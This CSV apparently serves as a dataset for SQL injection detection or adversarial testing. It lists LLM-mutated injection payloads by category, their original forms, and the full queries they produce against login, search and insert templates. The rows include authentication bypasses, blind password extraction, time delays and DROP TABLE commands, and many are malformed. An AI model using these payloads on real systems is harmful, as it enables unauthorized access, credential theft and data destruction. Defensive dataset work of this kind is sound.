attack_category,template_context,payload,full_query,label,source,generator_model,mutation_count,original_payload,failure_stage
union_based,login,' OR username='admin' AND password IS NULL--,SELECT * FROM users WHERE username = '' OR username='admin' AND password IS NULL--' AND password = 'anything',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,1'/**/OR/**/username/**/=/**/'admin'/**/AND/**/password/**/=/**/NULL/*,judge
union_based,login,') UNION SELECT username FROM (SELECT username FROM users ORDER BY username LIMIT 1 OFFSET 0);--,SELECT * FROM users WHERE username = '') UNION SELECT username FROM (SELECT username FROM users ORDER BY username LIMIT 1 OFFSET 0);--' AND password = 'anything',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,'%' LIKE '%' AND (SELECT username FROM (SELECT username FROM users ORDER BY username LIMIT 1 OFFSET 0))#,sandbox
union_based,login,"--) UNION SELECT username, password FROM admins","SELECT * FROM users WHERE username = '--) UNION SELECT username, password FROM admins' AND password = 'anything'",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"') UNION ALL SELECT username, password FROM admins--",sandbox
union_based,search,' OR WAITFOR DELAY '0:0:5''--,SELECT * FROM products WHERE name LIKE '%' OR WAITFOR DELAY '0:0:5''--%',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,'; WAITFOR DELAY '0:0:10'; --,judge
union_based,user_lookup,") UNION SELECT username, email FROM users --","SELECT * FROM users WHERE id = ) UNION SELECT username, email FROM users --",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,;WAITFOR DELAY '0:0:10' --,judge
union_based,user_lookup,";) UNION SELECT username, role FROM users;","SELECT * FROM users WHERE id = ;) UNION SELECT username, role FROM users;",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"; WAITFOR DELAY '0:0:5' UNION ALL SELECT NULL, NULL, NULL, NULL",judge
union_based,user_lookup,) AND username >= CHAR(97),SELECT * FROM users WHERE id = ) AND username >= CHAR(97),1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"/* OR '1'*/' OR ASCII(SUBSTRING(username,1,1))>ASCII('a')-1",judge
union_based,user_lookup,--/**/ OR '1'='1,SELECT * FROM users WHERE id = --/**/ OR '1'='1,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,/**/ OR /**/'1'='1,judge
union_based,order_filter,(SELECT 1 FROM users WHERE username = '') OR 1=1,SELECT * FROM orders WHERE status = '(SELECT 1 FROM users WHERE username = '') OR 1=1' ORDER BY date DESC,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,(CASE WHEN (SELECT 1 FROM users WHERE username = '') THEN 1 ELSE 0 END),sandbox
union_based,order_filter,' OR 1=1;,SELECT * FROM orders WHERE status = '' OR 1=1;' ORDER BY date DESC,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,'; DROP TABLE IF EXISTS temp_table; SELECT * FROM orders WHERE status = ',sandbox
union_based,comment_insert,' OR 1=1 --),"INSERT INTO comments (user_id, body) VALUES (1, '' OR 1=1 --)')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"1' UNION ALL SELECT username, password FROM users --",sandbox
union_based,comment_insert,*/ WAITFOR DELAY '0:0:3' OR 1=1 --),"INSERT INTO comments (user_id, body) VALUES (1, '*/ WAITFOR DELAY '0:0:3' OR 1=1 --)')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"'; WAITFOR DELAY '0:0:3' UNION SELECT CONCAT(username, password) AS credentials FROM auth.users --",judge
blind_boolean,login,' AND password LIKE 'A%'--,SELECT * FROM users WHERE username = '' AND password LIKE 'A%'--' AND password = 'anything',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"\' AND ASCII(SUBSTRING(password,1,1))>100 --""",sandbox
blind_boolean,login,' OR username LIKE 'A%'#,SELECT * FROM users WHERE username = '' OR username LIKE 'A%'#' AND password = 'anything',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"' AND (ASCII(SUBSTR(username,1,1))=65)#",sandbox
blind_boolean,search,'; WAITFOR DELAY '00:00:10' AND 1=1;,SELECT * FROM products WHERE name LIKE '%'; WAITFOR DELAY '00:00:10' AND 1=1;%',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,1'; WAITFOR DELAY '00:00:10'--,judge
blind_boolean,search,' OR (username LIKE '%A%' AND user_id IN (SELECT user_id FROM admin));,SELECT * FROM products WHERE name LIKE '%' OR (username LIKE '%A%' AND user_id IN (SELECT user_id FROM admin));%',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,' OR 1=1 /*,judge
blind_boolean,search,' OR (password LIKE '%A%' AND user_type = 'admin');,SELECT * FROM products WHERE name LIKE '%' OR (password LIKE '%A%' AND user_type = 'admin');%',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,' OR 1=1 /\*,judge
blind_boolean,user_lookup,; WAITFOR DELAY '0:0:5' --,SELECT * FROM users WHERE id = ; WAITFOR DELAY '0:0:5' --,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,; IF (SELECT COUNT(*) FROM (SELECT 1 WHERE 1=1)) > 0 THEN WAITFOR DELAY '0:0:5'; END;,judge
blind_boolean,comment_insert,; WAITFOR DELAY '0:0:5' --,"INSERT INTO comments (user_id, body) VALUES (1, '; WAITFOR DELAY '0:0:5' --')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,'; WAITFOR DELAY '0:0:5' --,judge
blind_boolean,comment_insert,"-32767 OR ASCII(SUBSTRING(password, 1, 1)) = 97","INSERT INTO comments (user_id, body) VALUES (1, '-32767 OR ASCII(SUBSTRING(password, 1, 1)) = 97')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"-32767\"" AND SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1) = 'a'""",sandbox
blind_time,order_filter,-- WAITFOR DELAY '0:0:5';,SELECT * FROM orders WHERE status = '-- WAITFOR DELAY '0:0:5';' ORDER BY date DESC,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"""; WAITFOR DELAY '0:0:5'; --",judge
blind_time,order_filter,- WAITFOR DELAY '0:0:4';,SELECT * FROM orders WHERE status = '- WAITFOR DELAY '0:0:4';' ORDER BY date DESC,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,'; WAITFOR DELAY '0:0:4'; UNION ALL --,judge
blind_time,comment_insert,- WAITFOR DELAY '0:0:3' AND 1=1,"INSERT INTO comments (user_id, body) VALUES (1, '- WAITFOR DELAY '0:0:3' AND 1=1')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,/*' OR 3<>3=(WAITFOR DELAY '0:0:3' AND 1=1)--*/',judge
stacked_queries,login,') WAITFOR DELAY '0:0:10';--,SELECT * FROM users WHERE username = '') WAITFOR DELAY '0:0:10';--' AND password = 'anything',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"; WAITFOR DELAY '0:0:10';--""",judge
comment_obfuscation,login,";-- ""
DB_NAME() LIKE '%temp%'
--""","SELECT * FROM users WHERE username = ';-- ""
DB_NAME() LIKE '%temp%'
--""' AND password = 'anything'",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"OR -- "" + String.fromCharCode(13) + String.fromCharCode(10) + "" DB_NAME() LIKE '%temp%' --""",sandbox
comment_obfuscation,login,-- OR (SELECT UPPER(SUBSTRING(name FROM sysdatabases ORDER BY dbid ASC LIMIT 1)) FROM users WHERE username = '') = 'M',SELECT * FROM users WHERE username = '-- OR (SELECT UPPER(SUBSTRING(name FROM sysdatabases ORDER BY dbid ASC LIMIT 1)) FROM users WHERE username = '') = 'M'' AND password = 'anything',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"OR (SELECT UPPER(SUBSTRING((SELECT name FROM master..sysdatabases ORDER BY dbid LIMIT 1), 1, 1)) FROM users WHERE username = ''' ) = 'M'/*""",judge
comment_obfuscation,login,"-- OR ASCII(SUBSTRING(username,1,1)) < 97","SELECT * FROM users WHERE username = '-- OR ASCII(SUBSTRING(username,1,1)) < 97' AND password = 'anything'",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"/*\' OR \'a\'=\'a*/,1/(SELECT 0)#""",judge
comment_obfuscation,login,") OR ASCII(SUBSTRING(username,1,1)) < 97--","SELECT * FROM users WHERE username = ') OR ASCII(SUBSTRING(username,1,1)) < 97--' AND password = 'anything'",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"/*\' OR ASCII(SUBSTRING(username,1,1))<97#",judge
comment_obfuscation,search,-- OR '1' = '1',SELECT * FROM products WHERE name LIKE '%-- OR '1' = '1'%',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,#' OR '1'='1',judge
comment_obfuscation,search,OR ('1' = '1')--,SELECT * FROM products WHERE name LIKE '%OR ('1' = '1')--%',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"\"" OR ('1'=\""1\"") --""",judge
comment_obfuscation,search,-- OR LOWER('1') = LOWER('1'),SELECT * FROM products WHERE name LIKE '%-- OR LOWER('1') = LOWER('1')%',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,#' OR LOWER('1') = LOWER('1'),judge
comment_obfuscation,user_lookup,-- OR SELECT * FROM users --,SELECT * FROM users WHERE id = -- OR SELECT * FROM users --,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,1' /* OR */ SELECT 1,judge
comment_obfuscation,order_filter,-- OR '1' --,SELECT * FROM orders WHERE status = '-- OR '1' --' ORDER BY date DESC,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,/**/1'/*--,judge
comment_obfuscation,order_filter,--1' OR (SELECT 1 FROM users WHERE role != 'admin'),SELECT * FROM orders WHERE status = '--1' OR (SELECT 1 FROM users WHERE role != 'admin')' ORDER BY date DESC,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,#1' /* AND (SELECT 1 FROM users WHERE role != 'admin') */,judge
comment_obfuscation,order_filter,#1' OR (SELECT 1 FROM products WHERE quantity > 0),SELECT * FROM orders WHERE status = '#1' OR (SELECT 1 FROM products WHERE quantity > 0)' ORDER BY date DESC,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,/**/1'/* OR (SELECT 1 FROM products WHERE quantity > 0) --,judge
comment_obfuscation,order_filter,1' OR (SELECT 1 FROM categories WHERE name ILIKE '%electronics%'),SELECT * FROM orders WHERE status = '1' OR (SELECT 1 FROM categories WHERE name ILIKE '%electronics%')' ORDER BY date DESC,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,/**/1' OR (SELECT 1 FROM categories WHERE name LIKE '%electronics%'),judge
comment_obfuscation,comment_insert,--1' OR (SELECT 1 FROM comments),"INSERT INTO comments (user_id, body) VALUES (1, '--1' OR (SELECT 1 FROM comments)')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,/**/1'/*OR*/1=1/**/,judge
comment_obfuscation,comment_insert,#1' OR (SELECT 1 FROM comments),"INSERT INTO comments (user_id, body) VALUES (1, '#1' OR (SELECT 1 FROM comments)')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,1' /*OR*/ 1=1 --,judge
comment_obfuscation,comment_insert,' OR '1'='1' --,"INSERT INTO comments (user_id, body) VALUES (1, '' OR '1'='1' --')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,1' OR 1=1 /*--,judge
comment_obfuscation,comment_insert,"%27%20AND%20ASCII(SUBSTRING(password,%201,%201))=%2065%20--","INSERT INTO comments (user_id, body) VALUES (1, '%27%20AND%20ASCII(SUBSTRING(password,%201,%201))=%2065%20--')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,/**/ 1' --%0D%0A#,judge
comment_obfuscation,comment_insert,; DROP TABLE comments --,"INSERT INTO comments (user_id, body) VALUES (1, '; DROP TABLE comments --')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,1' /*OR*/ (SELECT 1 FROM products WHERE price=0) --,judge
encoding_obfuscation,login,"--
' OR 'a'='a' --""","SELECT * FROM users WHERE username = '--
' OR 'a'='a' --""' AND password = 'anything'",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"1\' AND ASCII(SUBSTRING(password, 1, 1)) = 65 --""",sandbox
encoding_obfuscation,login,) OR (1=1 --,SELECT * FROM users WHERE username = ') OR (1=1 --' AND password = 'anything',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"1\' AND ASCII(SUBSTRING(username, 1, 1)) = 65 --",sandbox
encoding_obfuscation,login,"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 50 --","SELECT * FROM users WHERE username = '' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 50 --' AND password = 'anything'",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"1\' AND INET_NTOA(UNHEX(REPLACE(DATABASE(), ' ', ''))) LIKE '1%' --""",sandbox
encoding_obfuscation,search,; WAITFOR DELAY '0:0:5'; EXECUTE('DROP TABLE users')--,SELECT * FROM products WHERE name LIKE '%; WAITFOR DELAY '0:0:5'; EXECUTE('DROP TABLE users')--%',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,%23--',sandbox
encoding_obfuscation,search,%23 WAITFOR DELAY '0:0:5' %23 UNION SELECT NULL--,SELECT * FROM products WHERE name LIKE '%%23 WAITFOR DELAY '0:0:5' %23 UNION SELECT NULL--%',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,%23WAITFOR%20DELAY%20'0:0:5'%20AND%20(CHAR(65)%20LIKE%20'%23'),judge
encoding_obfuscation,search,"%23 UNION ALL SELECT NULL, NULL, NULL, NULL--","SELECT * FROM products WHERE name LIKE '%%23 UNION ALL SELECT NULL, NULL, NULL, NULL--%'",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"1%'%20UNION%20SELECT%20NULL,%20NULL,%20NULL,%20NULL%20FROM%20users--",judge
encoding_obfuscation,search,. OR 1=1; --,SELECT * FROM products WHERE name LIKE '%. OR 1=1; --%',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,1%2B'%'%20AS%20x%2BWHERE%20(SELECT%20SUM(id)%20FROM%20products)%20=%%20(SELECT%20SUM(id)%20FROM%20products),sandbox
encoding_obfuscation,user_lookup,%22 OR (ASCII('A')+ASCII('I')) = (ASCII('B')+ASCII('C')+ASCII('O')+ASCII('e')) AND ('%' = '%),SELECT * FROM users WHERE id = %22 OR (ASCII('A')+ASCII('I')) = (ASCII('B')+ASCII('C')+ASCII('O')+ASCII('e')) AND ('%' = '%),1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,%22%20or%20(CHAR(65)%2BCHAR(73))%20=%20(CHAR(66)%2BCHAR(67)%2BCHAR(79)%2BCHAR(101))%20and%20('%25'%20=%20',judge
encoding_obfuscation,user_lookup,"'""')#","SELECT * FROM users WHERE id = '""')#",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,'%22)%23,sandbox
encoding_obfuscation,user_lookup,%27 OR (SELECT ASCII('Q')+ASCII('A')+ASCII('R')+ASCII('I')+ASCII('D')+ASCII('J') FROM pg_stat_activity) LIKE '%' --,SELECT * FROM users WHERE id = %27 OR (SELECT ASCII('Q')+ASCII('A')+ASCII('R')+ASCII('I')+ASCII('D')+ASCII('J') FROM pg_stat_activity) LIKE '%' --,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,%27%20OR%20(SELECT%20CHAR%2881%29%2BCHAR%2865%29%2BCHAR%2882%29%2BCHAR%2873%29%2BCHAR%2868%29%2BCHAR%2871%29%20FROM%20pg_stat_activity)%20LIKE%20'%,judge
encoding_obfuscation,user_lookup,"#/**/"" OR SLEEP(5) AND ('%' = '%')#","SELECT * FROM users WHERE id = #/**/"" OR SLEEP(5) AND ('%' = '%')#",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,%23/**/%22%20OR%20(SLEEP(5)%20AND%20('%25'%20=%20'%25'))%23,judge
encoding_obfuscation,order_filter,;WAITFOR DELAY '0:0:10' --,SELECT * FROM orders WHERE status = ';WAITFOR DELAY '0:0:10' --' ORDER BY date DESC,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,%21%2f WAITFOR DELAY '0:0:10' --,judge
encoding_obfuscation,order_filter,/* */' OR LOWER('b') = LOWER('b') --,SELECT * FROM orders WHERE status = '/* */' OR LOWER('b') = LOWER('b') --' ORDER BY date DESC,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,/* */' OR LOWER('a') = LOWER('a,judge
encoding_obfuscation,order_filter,%23%23%23--%20DROP%20TABLE%20users,SELECT * FROM orders WHERE status = '%23%23%23--%20DROP%20TABLE%20users' ORDER BY date DESC,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,CHAR(35)%20AND%20LOWER('a')=%20LOWER('a')--,judge
encoding_obfuscation,comment_insert,; DROP TABLE users; CREATE TABLE hacked_table;,"INSERT INTO comments (user_id, body) VALUES (1, '; DROP TABLE users; CREATE TABLE hacked_table;')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"%23%23%23--%20SELECT%20dbms_pipe.receive_message(chr(66)%20||chr(67)%20||chr(79)%20||chr(101),5)%20FROM%20dual%20AND%20('%20='%20'",sandbox
encoding_obfuscation,comment_insert,CAST(%23%23%23--%20'x' AS VARCHAR),"INSERT INTO comments (user_id, body) VALUES (1, 'CAST(%23%23%23--%20'x' AS VARCHAR)')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,1)%2522)%2522)%2520WAITFOR%20DELAY%20'0:0:5'%2520AND%2520('%2520='%2520',judge
encoding_obfuscation,comment_insert,(CASE WHEN (SELECT COUNT(*) from users WHERE username LIKE 'admin') > 0 THEN 'hack' ELSE 'safe' END) --,"INSERT INTO comments (user_id, body) VALUES (1, '(CASE WHEN (SELECT COUNT(*) from users WHERE username LIKE 'admin') > 0 THEN 'hack' ELSE 'safe' END) --')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,1 AND (SELECT COUNT(*) FROM users WHERE username LIKE 'admin') --,sandbox
encoding_obfuscation,comment_insert,/*/#**//**///waitfor delay '00:00:05 '//*/ --'='--,"INSERT INTO comments (user_id, body) VALUES (1, '/*/#**//**///waitfor delay '00:00:05 '//*/ --'='--')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,%23%23%23%23%23/*/**/ WAITFOR DELAY '0:0:5' /*/%20AND%20('%20=%20',judge
encoding_obfuscation,comment_insert,"(select 1 from (select convert(int,(ascii(mid((select top 1 password from users order by id desc),1,1))))-65) > 0 --","INSERT INTO comments (user_id, body) VALUES (1, '(select 1 from (select convert(int,(ascii(mid((select top 1 password from users order by id desc),1,1))))-65) > 0 --')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"1) OR DBMS_PIPE.RECEIVE_MESSAGE('BCOE', 5) --",judge
encoding_obfuscation,comment_insert,OR (CASE WHEN USER LIKE 'admin%' THEN 'x' ELSE NULL END) IS NOT NULL --,"INSERT INTO comments (user_id, body) VALUES (1, 'OR (CASE WHEN USER LIKE 'admin%' THEN 'x' ELSE NULL END) IS NOT NULL --')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,1 OR (CASE WHEN USER LIKE '%admin'%' THEN 1 ELSE 0 END) --,judge
nested_injection,login,' OR EXISTS(SELECT * FROM users WHERE username LIKE ''%)' --,SELECT * FROM users WHERE username = '' OR EXISTS(SELECT * FROM users WHERE username LIKE ''%)' --' AND password = 'anything',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,' OR (SELECT * FROM users WHERE username = '') IS NULL/*,judge
nested_injection,search,--; waitfor delay '00:00:10' --,SELECT * FROM products WHERE name LIKE '%--; waitfor delay '00:00:10' --%',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,||;WAITFOR DELAY '0:0:10';--,judge
nested_injection,comment_insert,;-- DROP TABLE comments;,"INSERT INTO comments (user_id, body) VALUES (1, ';-- DROP TABLE comments;')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,/*' OR 1=1 AND (SELECT COUNT(*) FROM users WHERE username IS NULL) --,judge
nested_injection,comment_insert,"' OR (SELECT SUBSTRING(password, 1, 1) FROM users WHERE user_id=1)=CHAR(97)","INSERT INTO comments (user_id, body) VALUES (1, '' OR (SELECT SUBSTRING(password, 1, 1) FROM users WHERE user_id=1)=CHAR(97)')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,"/*' OR ASCII(SUBSTRING((SELECT password FROM users WHERE user_id=1), 1, 1))=97--",judge
nested_injection,comment_insert,' OR EXISTS(SELECT 1 FROM users WHERE username LIKE '%admin%'),"INSERT INTO comments (user_id, body) VALUES (1, '' OR EXISTS(SELECT 1 FROM users WHERE username LIKE '%admin%')')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,1,; WAITFOR DELAY '0:0:5' AND (SELECT 1 FROM (SELECT * FROM comments ORDER BY comment_id DESC LIMIT 1))--,judge
